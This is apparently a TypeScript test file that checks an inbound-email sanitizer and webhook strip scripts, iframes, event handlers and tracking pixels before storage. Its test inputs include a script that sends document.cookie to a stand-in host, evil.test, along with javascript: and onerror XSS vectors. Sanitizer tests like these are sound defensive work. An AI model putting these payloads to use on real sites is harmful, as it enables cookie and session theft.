import { createHmac } from 'node:crypto';
import express from 'express';
import request from 'supertest';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { sanitizeInboundEmailBody } from '../emailSanitizer.js';

const SECRET = 'test-inbound-email-secret';

vi.mock('@/config/env', () => ({
  env: {
    EMAIL_INBOUND_WEBHOOK_SECRET: 'test-inbound-email-secret',
  },
}));

vi.mock('@/lib/logger', () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() },
}));

vi.mock('@/lib/async-context', () => ({
  requestContext: {
    run: async (_store: unknown, fn: () => unknown) => fn(),
  },
}));

vi.mock('@/shared/security/webhookReplayGuard', () => ({
  claimWebhookDelivery: vi.fn().mockResolvedValue('fresh'),
  validateWebhookTimestamp: vi.fn().mockReturnValue({ valid: true }),
  webhookDeliveryFingerprint: vi.fn(() => 'fp-email-1'),
}));

const prismaMock = {
  emailMessage: {
    findUnique: vi.fn(),
    create: vi.fn(),
    findMany: vi.fn(),
  },
  lead: {
    findFirst: vi.fn(),
    update: vi.fn(),
  },
  contact: {
    findFirst: vi.fn(),
    update: vi.fn(),
  },
  timelineEvent: {
    create: vi.fn(),
  },
};

vi.mock('@/lib/prisma', () => ({ prisma: prismaMock }));

vi.mock('@/features/cadence/infra/emailIntentClassifier', () => ({
  emailIntentClassifier: { classify: vi.fn().mockResolvedValue({ intent: 'neutral' }) },
}));

vi.mock('@/features/cadence/infra/PrismaConversationSignalPort', () => ({
  prismaConversationSignalPort: { record: vi.fn().mockResolvedValue(undefined) },
}));

vi.mock('@/shared/services/optOutService', () => ({
  isOptOutKeyword: vi.fn().mockReturnValue(false),
  recordOptOut: vi.fn().mockResolvedValue(undefined),
}));

vi.mock('@/shared/infra/PrismaOptOutRepository', () => ({
  prismaOptOutRepository: {},
}));

describe('[55 · Ícaro] Sanitização de e-mail inbound (emailSanitizer + emailReply.webhook)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    prismaMock.emailMessage.findUnique.mockResolvedValue(null);
    prismaMock.emailMessage.create.mockResolvedValue({ id: 'msg-1' });
    prismaMock.emailMessage.findMany.mockResolvedValue([]);
    prismaMock.lead.findFirst.mockResolvedValue({ id: 'lead-1' });
    prismaMock.timelineEvent.create.mockResolvedValue({});
  });

  it('remove tags <script>, <iframe>, handlers on* e URIs javascript: preservando texto legítimo', () => {
    const dirty = [
      '<p>Olá equipe,</p>',
      '<script>fetch("https://evil.test/steal?c=" + document.cookie)</script>',
      '<iframe src="https://evil.test/frame"></iframe>',
      '<a href="javascript:alert(1)" onclick="steal()">Clique aqui</a>',
      '<img src="https://cdn.example.com/foto.png" width="300" height="200" onerror="alert(2)">',
    ].join('');

    const sanitized = sanitizeInboundEmailBody(dirty);

    expect(sanitized).toContain('<p>Olá equipe,</p>');
    expect(sanitized).not.toMatch(/<script/i);
    expect(sanitized).not.toMatch(/<iframe/i);
    expect(sanitized).not.toMatch(/onclick/i);
    expect(sanitized).not.toMatch(/onerror/i);
    expect(sanitized).not.toMatch(/javascript:/i);
    expect(sanitized).toContain('src="https://cdn.example.com/foto.png"');
  });

  it('remove pixels espiões 1x1, 0x0, ocultos via style (display:none / visibility:hidden / opacity:0) e URLs de open-tracker', () => {
    const htmlWithTrackers = [
      '<p>Tenho interesse na proposta.</p>',
      '<img src="https://tracker.example.com/open.gif" width="1" height="1" />',
      '<img src="https://tracker.example.com/zero.gif" width="0" height="0">',
      '<img src="https://tracker.example.com/hidden.png" style="display: none">',
      '<img src="https://tracker.example.com/vis.png" style="visibility:hidden;width:10px">',
      '<img src="https://sendgrid.net/wf/open?upn=abc123">',
      '<img src="https://empresa.com.br/assinatura.png" width="180" height="60" alt="Logo">',
    ].join('\n');

    const sanitized = sanitizeInboundEmailBody(htmlWithTrackers);

    expect(sanitized).toContain('<p>Tenho interesse na proposta.</p>');
    expect(sanitized).not.toContain('open.gif');
    expect(sanitized).not.toContain('zero.gif');
    expect(sanitized).not.toContain('hidden.png');
    expect(sanitized).not.toContain('vis.png');
    expect(sanitized).not.toContain('sendgrid.net/wf/open');
    expect(sanitized).toContain('https://empresa.com.br/assinatura.png');
  });

  it('sanitiza o corpo antes de persistir em prisma.emailMessage.create no webhook POST /webhook', async () => {
    const { emailReplyWebhookRoutes } = await import('../emailReply.webhook.js');
    const app = express();
    app.use(emailReplyWebhookRoutes);

    const payload = {
      organizationId: 'org-1',
      leadId: 'lead-1',
      providerMessageId: 'msg-inbound-99',
      fromEmail: 'cliente@empresa.com.br',
      toEmail: 'vendas@birthhub.com.br',
      subject: 'Re: Proposta Comercial',
      body: '<div>Segue retorno.<script> evil() </script><img src="https://t.test/p.gif" width="1" height="1"></div>',
    };
    const raw = JSON.stringify(payload);
    const sig = createHmac('sha256', SECRET).update(Buffer.from(raw, 'utf8')).digest('hex');

    const res = await request(app)
      .post('/webhook')
      .set('Content-Type', 'application/json')
      .set('x-email-inbound-signature', sig)
      .set('x-email-timestamp', String(Math.floor(Date.now() / 1000)))
      .send(raw);

    expect(res.status).toBe(200);
    expect(prismaMock.emailMessage.create).toHaveBeenCalledTimes(1);
    const persistedBody = prismaMock.emailMessage.create.mock.calls[0][0].data.body as string;
    expect(persistedBody).toBe('<div>Segue retorno.</div>');
  });
});
